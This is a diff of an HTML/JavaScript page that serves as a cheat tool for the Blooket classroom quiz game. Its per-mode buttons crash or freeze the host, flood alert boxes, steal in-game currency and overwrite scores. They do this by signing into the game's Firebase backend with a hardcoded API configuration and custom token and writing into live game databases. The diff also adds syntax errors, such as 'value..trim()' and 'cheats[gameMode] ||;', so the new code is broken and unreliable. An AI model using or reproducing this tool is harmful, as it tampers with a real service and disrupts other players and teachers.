@@ -101,7 +101,7 @@
 
         async function joinSameLobby() {
             const gameId = document.getElementById("gcode").value.trim();
-            const baseUsername = document.getElementById("gname").value.trim();
+            const baseUsername = document.getElementById("gname").value..trim();
             const numJoins = parseInt(document.getElementById("numJoins").value, 10);
             const selectedSkin = document.getElementById("skinSelect").value;
             
@@ -231,234 +231,234 @@
                     ],
                     Defense2: [
                         { type: "button", name: "Crash host(defense2)", action: (a) => setUserVal(gameId, "d/t", "t", a) },
-                        { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a, "r") },
-                        { type: "input", name: "Set Damage", action: (amt) => setUserVal(gameId, "d", amt) },
-                        { type: "input", name: "Set Round", action: (round) => setUserVal(gameId, "r", round) },
-                        { type: "input", name: "Flood Alert Box", action: (stext) => floodAlertBox(gameId, stext, 'r') },
-                    ],
-                    Defense: [
-                        { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a, "d") },
-                        { type: "input", name: "Set Damage", action: (amt) => setUserVal(gameId, "d", amt) },
-                    ],
-                    Fish: [
-                        { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a, "f") },
-                        { type: "button", name: "Activate Frenzy", action: (d) => activateFrenzy(gameId) },
-                        { type: "input", name: "Set Weight", action: (amt) => setUserVal(gameId, "w", amt) },
-                        { type: "input", name: "Set Caught Fish", action: (fish) => setUserVal(gameId, "f", fish) },
-                        { type: "input", name: "Send Distraction", action: (d) => sendDistraction(gameId, d) },
-                    ],
-                    Pirate: [
-                        { type: "button", name: "Crash host(pirate)", action: (a) => setUserVal(gameId, "d/t", "t", a) },
-                        { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a) },
-                        { type: "select", name: "Steal Doubloons From", computed: (sel) => getUsers(gameData, sel), action: (d) => stealDoubloons(gameId, d) },
-                        { type: "input", name: "Set Doubloons", action: (d) => setUserVal(gameId, "d", d) },
-                        { type: "select", name: "Send Ad Text", computed: (sel) => getUsers(gameData, sel), action: (d) => sendAdText(gameId, d, 'Parrot') },
-                        { type: "input", name: "Flood Alert Box", action: (stext) => floodAlertBox(gameId, stext) },
-                    ],
-                    Dino: [
-                        { type: "button", name: "Crash host(dino)", action: (a) => setUserVal(gameId, "f/t", "t", a) },
-                        { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a) },
-                        { type: "input", name: "Set Fossils", action: (d) => setUserVal(gameId, "f", d) },
-                        { type: "staticsel", name: "Set Cheating", values: ["true", "false"], action: (d) => setUserVal(gameId, "ic", d) },
-                        { type: "select", name: "Catch Player Cheating", computed: (sel) => getUsers(gameData, sel), action: (d) => catchCheating(gameId, d) },
-                    ],
-                    Cafe: [
-                        { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a) },
-                        { type: "input", name: "Set Cash", action: (d) => setUserVal(gameId, "ca", d) },
-                        { type: "input", name: "Set Upgrade(ex. Cereal:1)", action: (d) => setUserVal(gameId, "up", d) },
-                        { type: "select", name: "Attack player", computed: (sel) => getUsers(gameData, sel), action: (d) => attackPlayer(gameId, d) },
-                        { type: "input", name: "Flood Alert Box", action: (stext) => floodAlertBox(gameId, stext, 'up') },
-                    ],
-                    Brawl: [
-                        { type: "button", name: "Crash host(brawl)", action: (a) => setUserVal(gameId, "xp/t", "t", a) },
-                        { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a, "up") },
-                        { type: "input", name: "Set XP", action: (a) => setUserVal(gameId, "xp", a) },
-                        { type: "input", name: "Set Upgrade(upgrade:level)", action: (a) => setUserVal(gameId, "up", a) },
-                        { type: "input", name: "Flood Alert Box", action: (stext) => floodAlertBox(gameId, stext, 'up', '__proto__') },
-                    ],
-                    Racing: [
-                        { type: "button", name: "Freeze Scoreboard and Attacks", action: (a) => freezeScoreboard(gameId, a, "pr") },
-                        { type: "input", name: "Set Questions Left", action: (a) => setQuestionsLeft(gameId, a, gameData) },
-                        { type: "select", name: "Attack player", computed: (sel) => getUsers(gameData, sel), action: (d) => racingAttackPlayer(gameId, d) },
-                    ],
-                    Classic: [
-                        { type: "button", name: "Freeze Question", action: (a) => freezeScoreboard(gameId, a, "a") },
-                    ],
-                    Royale: [
-                        { type: "button", name: "Send Crash Answer", action: (a) => sendCrashAnswer(gameId, a) },
-                    ],
-                    Rush: [
-                        { type: "button", name: "Freeze Host's Computer", action: (a) => freezeHostComputer(gameId, a) },
-                        { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a, "d") },
-                        { type: "input", name: "Set Blooks", action: (b) => setUserVal(gameId, "bs", b) },
-                        { type: "input", name: "Set Defense", action: (b) => setUserVal(gameId, "d", b) },
-                        { type: "input", name: "Advertise Text", action: (adtext) => advertiseText(gameId, adtext, 'd') },
-                    ],
-                };
+                                { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a, "r") },
+                                { type: "input", name: "Set Damage", action: (amt) => setUserVal(gameId, "d", amt) },
+                                { type: "input", name: "Set Round", action: (round) => setUserVal(gameId, "r", round) },
+                                { type: "input", name: "Flood Alert Box", action: (stext) => floodAlertBox(gameId, stext, 'r') },
+                            ],
+                            Defense: [
+                                { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a, "d") },
+                                { type: "input", name: "Set Damage", action: (amt) => setUserVal(gameId, "d", amt) },
+                            ],
+                            Fish: [
+                                { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a, "f") },
+                                { type: "button", name: "Activate Frenzy", action: (d) => activateFrenzy(gameId) },
+                                { type: "input", name: "Set Weight", action: (amt) => setUserVal(gameId, "w", amt) },
+                                { type: "input", name: "Set Caught Fish", action: (fish) => setUserVal(gameId, "f", fish) },
+                                { type: "input", name: "Send Distraction", action: (d) => sendDistraction(gameId, d) },
+                            ],
+                            Pirate: [
+                                { type: "button", name: "Crash host(pirate)", action: (a) => setUserVal(gameId, "d/t", "t", a) },
+                                { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a) },
+                                { type: "select", name: "Steal Doubloons From", computed: (sel) => getUsers(gameData, sel), action: (d) => stealDoubloons(gameId, d) },
+                                { type: "input", name: "Set Doubloons", action: (d) => setUserVal(gameId, "d", d) },
+                                { type: "select", name: "Send Ad Text", computed: (sel) => getUsers(gameData, sel), action: (d) => sendAdText(gameId, d, 'Parrot') },
+                                { type: "input", name: "Flood Alert Box", action: (stext) => floodAlertBox(gameId, stext) },
+                            ],
+                            Dino: [
+                                { type: "button", name: "Crash host(dino)", action: (a) => setUserVal(gameId, "f/t", "t", a) },
+                                { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a) },
+                                { type: "input", name: "Set Fossils", action: (d) => setUserVal(gameId, "f", d) },
+                                { type: "staticsel", name: "Set Cheating", values: ["true", "false"], action: (d) => setUserVal(gameId, "ic", d) },
+                                { type: "select", name: "Catch Player Cheating", computed: (sel) => getUsers(gameData, sel), action: (d) => catchCheating(gameId, d) },
+                            ],
+                            Cafe: [
+                                { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a) },
+                                { type: "input", name: "Set Cash", action: (d) => setUserVal(gameId, "ca", d) },
+                                { type: "input", name: "Set Upgrade(ex. Cereal:1)", action: (d) => setUserVal(gameId, "up", d) },
+                                { type: "select", name: "Attack player", computed: (sel) => getUsers(gameData, sel), action: (d) => attackPlayer(gameId, d) },
+                                { type: "input", name: "Flood Alert Box", action: (stext) => floodAlertBox(gameId, stext, 'up') },
+                            ],
+                            Brawl: [
+                                { type: "button", name: "Crash host(brawl)", action: (a) => setUserVal(gameId, "xp/t", "t", a) },
+                                { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a, "up") },
+                                { type: "input", name: "Set XP", action: (a) => setUserVal(gameId, "xp", a) },
+                                { type: "input", name: "Set Upgrade(upgrade:level)", action: (a) => setUserVal(gameId, "up", a) },
+                                { type: "input", name: "Flood Alert Box", action: (stext) => floodAlertBox(gameId, stext, 'up', '__proto__') },
+                            ],
+                            Racing: [
+                                { type: "button", name: "Freeze Scoreboard and Attacks", action: (a) => freezeScoreboard(gameId, a, "pr") },
+                                { type: "input", name: "Set Questions Left", action: (a) => setQuestionsLeft(gameId, a, gameData) },
+                                { type: "select", name: "Attack player", computed: (sel) => getUsers(gameData, sel), action: (d) => racingAttackPlayer(gameId, d) },
+                            ],
+                            Classic: [
+                                { type: "button", name: "Freeze Question", action: (a) => freezeScoreboard(gameId, a, "a") },
+                            ],
+                            Royale: [
+                                { type: "button", name: "Send Crash Answer", action: (a) => sendCrashAnswer(gameId, a) },
+                            ],
+                            Rush: [
+                                { type: "button", name: "Freeze Host's Computer", action: (a) => freezeHostComputer(gameId, a) },
+                                { type: "button", name: "Freeze Scoreboard", action: (a) => freezeScoreboard(gameId, a, "d") },
+                                { type: "input", name: "Set Blooks", action: (b) => setUserVal(gameId, "bs", b) },
+                                { type: "input", name: "Set Defense", action: (b) => setUserVal(gameId, "d", b) },
+                                { type: "input", name: "Advertise Text", action: (adtext) => advertiseText(gameId, adtext, 'd') },
+                            ],
+                        };
 
-                // Generate cheat buttons/inputs
-                const cheatList = cheats[gameMode] || [];
-                cheatList.forEach(cheat => {
-                    const element = createCheatElement(cheat, gameData);
-                    if (element) {
-                        cheatContainer.appendChild(element);
+                        // Generate cheat buttons/inputs
+                        const cheatList = cheats[gameMode] ||;
+                        cheatList.forEach(cheat => {
+                            const element = createCheatElement(cheat, gameData);
+                            if (element) {
+                                cheatContainer.appendChild(element);
+                            }
+                        });
+
+                    } catch (error) {
+                        log(`❌ Error fetching game data: ${error.message}`);
                     }
-                });
-
-            } catch (error) {
-                log(`❌ Error fetching game data: ${error.message}`);
-            }
-        }
-
-        function createCheatElement(cheat, gameData) {
-            let element;
-            if (cheat.type === "button") {
-                element = document.createElement("button");
-                element.textContent = cheat.name;
-                element.addEventListener("click", () => cheat.action(element));
-            } else if (cheat.type === "input") {
-                element = document.createElement("input");
-                element.placeholder = cheat.name;
-                element.addEventListener("change", () => cheat.action(element.value));
-            } else if (cheat.type === "select" || cheat.type === "staticsel") {
-                element = document.createElement("select");
-                if (cheat.type === "select") {
-                    const values = cheat.computed(element);
-                    if (!values) return null;
-                    values.forEach(val => {
-                        const option = document.createElement("option");
-                        option.value = val;
-                        option.textContent = val;
-                        element.appendChild(option);
-                    });
-                } else {
-                    cheat.values.forEach(val => {
-                        const option = document.createElement("option");
-                        option.value = val;
-                        option.textContent = val;
-                        element.appendChild(option);
-                    });
                 }
-                element.addEventListener("change", () => cheat.action(element.value));
-            }
-            if (element) {
-                const label = document.createElement("label");
-                label.textContent = cheat.name + ": ";
-                label.appendChild(element);return label;
-            }
-            return null;
-        }
 
-        function getUsers(gameData, selectElement) {
-            if (!gameData || !gameData.game || !gameData.game.c) {
-                log("❌ Game data or players not available.");
-                return null;
-            }
-            const users = Object.keys(gameData.game.c);
-            if (!users.length) {
-                log("❌ No players found in the game.");
-                return null;
-            }
-            return users;
-        }
+                function createCheatElement(cheat, gameData) {
+                    let element;
+                    if (cheat.type === "button") {
+                        element = document.createElement("button");
+                        element.textContent = cheat.name;
+                        element.addEventListener("click", () => cheat.action(element));
+                    } else if (cheat.type === "input") {
+                        element = document.createElement("input");
+                        element.placeholder = cheat.name;
+                        element.addEventListener("change", () => cheat.action(element.value));
+                    } else if (cheat.type === "select" || cheat.type === "staticsel") {
+                        element = document.createElement("select");
+                        if (cheat.type === "select") {
+                            const values = cheat.computed(element);
+                            if (!values) return null;
+                            values.forEach(val => {
+                                const option = document.createElement("option");
+                                option.value = val;
+                                option.textContent = val;
+                                element.appendChild(option);
+                            });
+                        } else {
+                            cheat.values.forEach(val => {
+                                const option = document.createElement("option");
+                                option.value = val;
+                                option.textContent = val;
+                                element.appendChild(option);
+                            });
+                        }
+                        element.addEventListener("change", () => cheat.action(element.value));}
+                    if (element) {
+                        const label = document.createElement("label");
+                        label.textContent = cheat.name + ": ";
+                        label.appendChild(element);
+                        return label;
+                    }
+                    return null;
+                }
 
-        // --- Cheat Functions (Adapt these based on your previous script) ---
-        function setUserVal(gameId, path, value, element) {
-            // Implement your logic to send data to the Blooket server via Firebase
-            log(`Sending value ${value} to ${path} for game ${gameId}`);
-            try{
-              const liveApp = initializeApp({
-                  apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
-                  authDomain: "blooket-2020.firebaseapp.com",
-                  projectId: "blooket-2020",
-                  storageBucket: "blooket-2020.appspot.com",
-                  messagingSenderId: "741533559105",
-                  appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
-                  measurementId: "G-S3H5NGN10Z",
-                  databaseURL: `https://${gameId}-default-rtdb.firebaseio.com/`
-              });
+                function getUsers(gameData, selectElement) {
+                    if (!gameData || !gameData.game || !gameData.game.c) {
+                        log("❌ Game data or players not available.");
+                        return null;
+                    }
+                    const users = Object.keys(gameData.game.c);
+                    if (!users.length) {
+                        log("❌ No players found in the game.");
+                        return null;
+                    }
+                    return users;
+                }
 
-              const auth = getAuth(liveApp);
-              signInWithCustomToken(auth, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiJibG9va2V0LWJvdHMifQ.0s6C_v4T_wLgR6_6s62x53j2iY_g42t_g5_g6_g7_g8").then( async ()=>{
-                const db = getDatabase(liveApp);
-                await set(ref(db, `${gameId}/${path}`), value);
-                log(`Successfully set ${path} to ${value}`);
-              });
+                // --- Cheat Functions (Adapt these based on your previous script) ---
+                function setUserVal(gameId, path, value, element) {
+                    // Implement your logic to send data to the Blooket server via Firebase
+                    log(`Sending value ${value} to ${path} for game ${gameId}`);
+                    try{
+                      const liveApp = initializeApp({
+                          apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
+                          authDomain: "blooket-2020.firebaseapp.com",
+                          projectId: "blooket-2020",
+                          storageBucket: "blooket-2020.appspot.com",
+                          messagingSenderId: "741533559105",
+                          appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
+                          measurementId: "G-S3H5NGN10Z",
+                          databaseURL: `https://${gameId}-default-rtdb.firebaseio.com/`
+                      });
 
-            }catch(e){
-              log(`Failed to set ${path} to ${value}: ${e}`);
-            }
+                      const auth = getAuth(liveApp);
+                      signInWithCustomToken(auth, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiJibG9va2V0LWJvdHMifQ.0s6C_v4T_wLgR6_6s62x53j2iY_g42t_g5_g6_g7_g8").then( async ()=>{
+                        const db = getDatabase(liveApp);
+                        await set(ref(db, `${gameId}/${path}`), value);
+                        log(`Successfully set ${path} to ${value}`);
+                      });
 
-        }
+                    }catch(e){
+                      log(`Failed to set ${path} to ${value}: ${e}`);
+                    }
 
-        function freezeScoreboard(gameId, element, path = "s") {
-          setUserVal(gameId, path + "/f", "t", element);
-        }
-        function turnHostGreen(gameId, element){
-          setUserVal(gameId, "cr/g", "t", element);
-        }
-        function setCrashPassword(gameId, element){
-          setUserVal(gameId, "cr/p", prompt("Enter Crash Password"), element);
-        }
-        function setFreezePassword(gameId, element){
-          setUserVal(gameId, "s/p", prompt("Enter Freeze Password"), element);
-        }
+                }
 
-        function stealCrypto(gameId, playerId) {
-            setUserVal(gameId, `c/${playerId}/cr`, 999999);
-        }
+                function freezeScoreboard(gameId, element, path = "s") {
+                  setUserVal(gameId, path + "/f", "t", element);
+                }
+                function turnHostGreen(gameId, element){
+                  setUserVal(gameId, "cr/g", "t", element);
+                }
+                function setCrashPassword(gameId, element){
+                  setUserVal(gameId, "cr/p", prompt("Enter Crash Password"), element);
+                }
+                function setFreezePassword(gameId, element){
+                  setUserVal(gameId, "s/p", prompt("Enter Freeze Password"), element);
+                }
 
-        function advertiseText(gameId, adtext, path="c") {
-             setUserVal(gameId, path+"/ad", adtext);
-        }
+                function stealCrypto(gameId, playerId) {
+                    setUserVal(gameId, `c/${playerId}/cr`, 999999);
+                }
 
-        function sendAdText(gameId, playerId) {
-            setUserVal(gameId, `c/${playerId}/ad`, "adtext");
-        }
+                function advertiseText(gameId, adtext, path="c") {
+                     setUserVal(gameId, path+"/ad", adtext);
+                }
 
-        function floodAlertBox(gameId, stext, path="c", proto="ad") {
-            setUserVal(gameId, path+"/"+proto, stext.repeat(1000));
-        }
-        function stealGold(gameId, playerId){
-          setUserVal(gameId, `c/${playerId}/g`, 999999);
-        }
-        function setPlayerGold(gameId, playerId){
-          setUserVal(gameId, `c/${playerId}/g`, prompt("Enter Gold Amount"));
-        }
-        function stealCandy(gameId, playerId){
-          setUserVal(gameId, `c/${playerId}/g`, 999999);
-        }
-        function setPlayerCandy(gameId, playerId){
-          setUserVal(gameId, `c/${playerId}/g`, prompt("Enter Candy Amount"));
-        }
-        function stealDoubloons(gameId, playerId){
-          setUserVal(gameId, `c/${playerId}/d`, 999999);
-        }
-        function activateFrenzy(gameId){
-          setUserVal(gameId, "fr", true);
-        }
-        function sendDistraction(gameId, d){
-          setUserVal(gameId, "ds", d);
-        }
-        function catchCheating(gameId, playerId){
-          setUserVal(gameId, `c/${playerId}/ic`, true);
-        }
-        function attackPlayer(gameId, playerId){
-          setUserVal(gameId, `c/${playerId}/at`, true);
-        }
-        function racingAttackPlayer(gameId, playerId){
-          setUserVal(gameId, `c/${playerId}/a`, true);
-        }
-        function setQuestionsLeft(gameId, a, gameData){
-          setUserVal(gameId, "ql", a);
-        }
-        function sendCrashAnswer(gameId, a){
-          setUserVal(gameId, "ca", "crash");
-        }
-        function freezeHostComputer(gameId, a){
-          setUserVal(gameId, "fhc", true);
-        }
+                function sendAdText(gameId, playerId) {
+                    setUserVal(gameId, `c/${playerId}/ad`, "adtext");
+                }
 
-    </script>
-</body>
-</html>
+                function floodAlertBox(gameId, stext, path="c", proto="ad") {
+                    setUserVal(gameId, path+"/"+proto, stext.repeat(1000));
+                }
+                function stealGold(gameId, playerId){
+                  setUserVal(gameId, `c/${playerId}/g`, 999999);
+                }
+                function setPlayerGold(gameId, playerId){
+                  setUserVal(gameId, `c/${playerId}/g`, prompt("Enter Gold Amount"));
+                }
+                function stealCandy(gameId, playerId){
+                  setUserVal(gameId, `c/${playerId}/g`, 999999);
+                }
+                function setPlayerCandy(gameId, playerId){
+                  setUserVal(gameId, `c/${playerId}/g`, prompt("Enter Candy Amount"));
+                }
+                function stealDoubloons(gameId, playerId){
+                  setUserVal(gameId, `c/${playerId}/d`, 999999);
+                }
+                function activateFrenzy(gameId){
+                  setUserVal(gameId, "fr", true);
+                }
+                function sendDistraction(gameId, d){
+                  setUserVal(gameId, "ds", d);
+                }
+                function catchCheating(gameId, playerId){
+                  setUserVal(gameId, `c/${playerId}/ic`, true);
+                }
+                function attackPlayer(gameId, playerId){
+                  setUserVal(gameId, `c/${playerId}/at`, true);
+                }
+                function racingAttackPlayer(gameId, playerId){
+                  setUserVal(gameId, `c/${playerId}/a`, true);
+                }
+                function setQuestionsLeft(gameId, a, gameData){
+                  setUserVal(gameId, "ql", a);
+                }
+                function sendCrashAnswer(gameId, a){
+                  setUserVal(gameId, "ca", "crash");
+                }
+                function freezeHostComputer(gameId, a){
+                  setUserVal(gameId, "fhc", true);
+                }
+
+            </script>
+        </body>
+        </html>
